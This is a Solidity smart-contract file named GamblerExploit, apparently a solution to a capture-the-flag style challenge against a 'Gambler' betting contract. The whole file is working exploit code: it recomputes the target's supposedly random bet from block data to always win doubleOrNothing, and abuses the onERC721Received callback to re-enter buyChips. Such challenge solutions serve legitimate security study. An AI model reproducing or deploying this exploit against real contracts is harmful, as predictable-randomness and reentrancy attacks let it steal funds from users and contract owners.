// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import "./Gambler/IERC721Receiver.sol";
import "./Gambler/Gambler.sol";

contract GamblerExploit is IERC721Receiver {
    Gambler immutable gambler;
    bool stopBuyChips;

    constructor(Gambler _gambler) {
        gambler = _gambler;
    }

    function start(address account) external payable {
        uint256 bet = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.coinbase,
                    account,
                    "sus"
                )
            )
        ) % block.difficulty;
        gambler.buyChips(16);
        gambler.getVerified{value: 0}();
        gambler.doubleOrNothing(account, bet);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        if (!stopBuyChips) {
            stopBuyChips = true;
            gambler.buyChips(16);
        }
        return this.onERC721Received.selector;
    }
}
